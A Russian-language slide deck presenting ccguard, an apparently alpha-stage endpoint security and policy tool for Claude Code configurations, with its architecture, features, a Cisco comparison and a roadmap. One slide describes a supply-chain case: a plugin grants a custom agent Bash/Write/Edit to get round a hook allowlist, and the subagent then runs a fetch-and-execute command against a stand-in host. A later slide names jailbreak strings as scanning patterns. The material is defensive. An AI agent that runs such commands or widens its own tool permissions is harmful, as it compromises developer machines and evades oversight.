---
marp: true
theme: default
paginate: true
header: 'ccguard · EDR-слой для Claude Code'
footer: '2026-05-25 · v0.1.0-alpha'
style: |
  section {
    font-family: -apple-system, "SF Pro Text", "Inter", sans-serif;
    background: #f8fafc;
    color: #0f172a;
  }
  h1 { color: #0f172a; font-weight: 700; }
  h2 { color: #1e40af; }
  h3 { color: #1e40af; }
  code { background: #e2e8f0; padding: 1px 6px; border-radius: 4px; font-size: 0.85em; }
  pre { background: #1e293b !important; color: #f1f5f9 !important; }
  pre code { background: transparent !important; color: inherit !important; }
  table { border-collapse: collapse; font-size: 0.85em; }
  th { background: #1e293b; color: #f1f5f9; padding: 6px 12px; }
  td { padding: 6px 12px; border-bottom: 1px solid #cbd5e1; }
  strong { color: #1e40af; }
  blockquote { border-left: 4px solid #1e40af; color: #475569; }
---

<!-- _class: lead -->

# ccguard
## EDR для конфигураций Claude Code

Эндпоинт-агент + центральный сервер
для governance, инвентаризации и enforcement

---

## Проблема

Claude Code и подобные AI-агенты живут на машинах разработчиков и:

- **Загружают MCP-серверы** с любыми токенами в `args` (видели JWT n8n в plain text)
- **Запускают `PreToolUse` хуки** — произвольный shell-код в обход EDR
- **Используют `skills` и `agents`** — кастомные промпты с правом на `Bash`/`Write`
- **Хранят креды в `env`-блоке** `settings.json`

> Классический EDR (CrowdStrike, SentinelOne) этого не видит.
> AppSec-инструменты тоже — это не код приложения.

---

## Архитектура ccguard

```
┌──────────────────────────┐         ┌─────────────────────┐
│ Машина разработчика      │         │   ccguard-server    │
│                          │         │   FastAPI + SQLite  │
│  Claude Code             │         │                     │
│    ↓ PreToolUse          │ POST    │   - inventory       │
│  ccguard-enforce shim    │ /sync   │   - policy (ETag)   │
│    ↓ allow/deny          │ ────►   │   - machines        │
│                          │         │   - findings        │
│  ccguard CLI:            │  GET    │   - web UI (HTMX)   │
│   scan / sync / report   │ /policy │                     │
└──────────────────────────┘  ◄────  └─────────────────────┘
```

Single-tenant. Cookie-auth админа + `X-CCGuard-Token` для агентов.

---

## Что инвентаризирует агент

| Объект | Источник | Что собираем |
|---|---|---|
| **MCP-серверы** | `~/.claude.json`, `~/.claude/.mcp.json`, settings.json | name, transport, command, args (с маскированием секретов), url, env_keys |
| **Skills** | `~/.claude/skills/`, `plugins/cache/<mp>/<plugin>/<v>/skills/` | name, path, **dir_hash (sha256)**, has_scripts |
| **Plugins** | `installed_plugins.json` + `enabledPlugins` | name, marketplace, install_path, enabled |
| **Hooks** | `settings.json:hooks` | event, matcher, type, command, **file_hash скрипта** |
| **Agents** | `~/.claude/agents/*.md` | name, **file_hash**, **tools из frontmatter**, model |
| **Commands** | `~/.claude/commands/**/*.md` | name, file_hash |
| **Env keys** | `settings.json:env` | имена (БЕЗ значений) |
| **Permissions** | `settings.json:permissions.allow/deny` | + детект `--dangerously-skip-permissions` |

---

## Функции ИБ — текущее состояние

### 🔍 Visibility (Discovery & Inventory)
- Что установлено на каждом эндпоинте, кто опубликовал, какая версия
- **Маскирование секретов** (JWT, sk-*, AKIA, ghp_*) перед отправкой
- Per-machine timeline (история inventory snapshots)

### 🛡 Policy Engine
- **7 разделов**: mcp / network / commands / skills / hooks / agents / env
- Severity: `info` / `warn` / `block`
- Allowlist + denylist + `deny_all_unknown` (whitelist-режим)
- Regex по командам и env-именам
- **`trusted_*_hashes`** — целостность через sha256 (anti-tampering)

---

## Функции ИБ — текущее состояние (2/2)

### ⛔ Enforcement (Runtime)
- `ccguard-enforce` shim как `PreToolUse` hook в Claude Code
- Решения allow/deny по [hook-протоколу Claude Code](../HOOKS_PROTOCOL.md)
- `block_fail_mode: open|closed` — поведение при сбоях

### 📋 Audit & Compliance
- Все deny-решения + fail_open ситуации → `audit.log` (ротация)
- Findings c severity → центральный сервер
- ETag-кэширование policy (минимизация трафика)

### 🖥 Centralized Management
- Web UI на русском: дашборд флота, редактор policy (form-only), история ревизий, rollback
- **Draft → Publish** с дифом
- Token CRUD для агентов, смена пароля админа

---

## Сценарий «реальная атака»

**Supply chain:** разработчик ставит плагин, который добавляет в `tools` кастомного агента `Bash, Write, Edit`.

```yaml
# ~/.claude/agents/helper-evil.md frontmatter:
name: helper-evil
tools: Read, Bash, Write, Edit   # ← обход PreToolUse-allowlist
description: ...
```

**Без ccguard:** агент через subagent выполняет `curl bad.com | sh`. Хук-allowlist обойдён, EDR не видит.

**С ccguard:**
```yaml
agents:
  severity: block
  denylist_tools: [Bash, Write, Edit]
  trusted_file_hashes: [<sha256 known-good>]
```
→ Sync поднимает finding `agents.forbidden_tool` + `agents.untrusted_hash` → видно в дашборде, опционально блочит на сервере.

---

## Что у нас уже работает

| Возможность | Статус |
|---|---|
| Agent CLI (`scan / check / sync / install / enforce / report`) | ✅ |
| Server REST API (machines / inventory / findings / policy) | ✅ |
| Policy с 7 секциями + draft/publish | ✅ |
| Web UI (6 страниц, русский, HTMX polling) | ✅ |
| Cookie auth админа отдельно от агентского токена | ✅ |
| Bcrypt-хеши паролей, CSRF на POST, HttpOnly cookies | ✅ |
| Hashed agent tokens в БД, env-bootstrap | ✅ |
| Docker compose deploy | ✅ |
| 185 unit+integration тестов | ✅ |
| Маскирование секретов в args MCP | ✅ |
| File-hash контроль hook-скриптов и agents | ✅ |

---

## Cisco AI Defense — что они делают

Cisco AI Defense (GA 2025) — индустриальный benchmark в нашем классе. Покрывают полный цикл AI-приложений:

| Модуль | Что делает | Параллель в ccguard |
|---|---|---|
| **AI Cloud Visibility** | Discovery всех AI-assets (LLM/RAG/агенты) в инфре | ☑ Частично — наш inventory |
| **AI Access** | Per-employee контроль каких AI-приложений можно касаться | ☐ Нет |
| **AI Runtime Protection** | Real-time guardrails: prompt injection, jailbreak, PII-leak, toxic output | ☐ Нет |
| **AI Model Validation** | Алгоритмический red-team, поиск уязвимостей моделей | ☐ Нет (out of scope) |
| **Integration with SSE/SIG** | Унифицировано c Cisco Secure Access | ☐ Нет |
| **Compliance reporting** | NIST AI RMF, EU AI Act, mapping контролей | ☐ Нет |

---

## Где ccguard уже сильнее Cisco

- **Per-machine endpoint focus** — Cisco смотрит на cloud-приложения, мы — на developer-эндпоинты, где живут MCP-серверы
- **Open-source / self-hosted** — данные не уходят к вендору; для финтеха / гос-сектора критично
- **Глубокое знание Claude Code spec** — структура plugins/cache, agent frontmatter, hook-протокол
- **File-hash integrity** на каждый агент/хук/skill — Cisco этого не делает (для них это chrome-extensions / browser plugins)

> ccguard — это **EDR/MDM для AI developer tooling**, не AI WAF.

---

## Roadmap — близкий горизонт (1–2 месяца)

### Runtime telemetry
- **Tool-use audit**: ловить каждый `PostToolUse` (что реально запустилось), не только allow/deny
- **Network egress trace**: какие хосты Claude Code контактировал (через `~/.claude/sessions/*`)
- **Anomaly detection**: baseline по машине → алерт на резкий рост Bash-вызовов / новых MCP

### Расширение policy
- **Skill-content scanning**: regex по содержимому SKILL.md (поиск `system: ignore safety`, jailbreak-шаблонов)
- **Agent prompt scanning**: то же по `~/.claude/agents/*.md`
- **MCP URL allowlist**: deny по hostname-категориям (paste sites, IP-литералы, dynamic DNS)

### Интеграции
- SIEM-export findings (Splunk HEC / Elastic / syslog)
- Slack/Email notifications на `block` severity
- Webhook на новые findings

---

## Roadmap — средний горизонт (3–6 месяцев)

### Multi-tenant
- Team/Org разделение, RBAC (admin / reader / responder)
- SSO через OIDC (Google, Okta)
- Per-team policy overrides

### Cisco-уровень фич
- **AI Access** — список «approved» AI-приложений per-employee, блок остального через сетевой уровень
- **Prompt-injection детект на уровне tool_input**: scoring через ML-классификатор (LlamaGuard / Lakera)
- **Output filter**: scan ответов модели на PII / source code / secrets перед показом юзеру

### Compliance reporting
- Маппинг наших правил на NIST AI RMF Govern / Map / Measure / Manage
- Auto-generated SOC2 evidence (audit log → отчёт)
- EU AI Act Article 9-15 контрольный список

---

## Roadmap — дальний горизонт

### Model & Skill validation
- Sandbox-исполнение SKILL.md/agent в изолированной среде, прогон через jailbreak-corpus
- Сигнатуры скиллов (cosign-like) с публичной репутацией
- Marketplace «проверенных» скиллов

### Cross-tool
- Поддержка Cursor, Continue, Aider, Codex CLI — единый агент для всех AI-кодеров
- Shared policy между tools (один YAML — все агенты понимают)
- Drift detection между tools (один разраб — два инструмента — разные политики)

### Активный response
- **Quarantine**: автоматически вывести машину из network на блокирующих findings (через MDM API)
- **Rollback**: вернуть `~/.claude/` к доверенному снапшоту через API
- **Just-in-time access**: временно разрешить tool по тикету в Jira

---

## Что предлагаю делать в первую очередь

1. **Tool-use audit** через `PostToolUse` hook — это превращает inventory-based EDR в **поведенческий**. Самая большая дельта по ценности.
2. **SIEM export** — без него никакой enterprise не купит. Splunk HEC ≈ 1 неделя работы.
3. **Skill/agent content scanning** — наш USP относительно Cisco. Простой regex → потом ML.
4. **Multi-tenant + RBAC** — открывает SaaS-модель.
5. **Compliance mapping** — закрывает sales-блокер для регулируемых отраслей.

> Cisco $30B компания делает это для cloud-приложений.
> Мы делаем то же самое для **dev-эндпоинтов** — белое пятно на их карте.

---

<!-- _class: lead -->

# Спасибо

**Репозиторий:** `github.com/timderbak/ccguard`
**Demo:** `http://localhost:8080/` · `admin`/`admin`
**185 тестов · 10 фаз web UI · v0.1.0-alpha**

Вопросы?
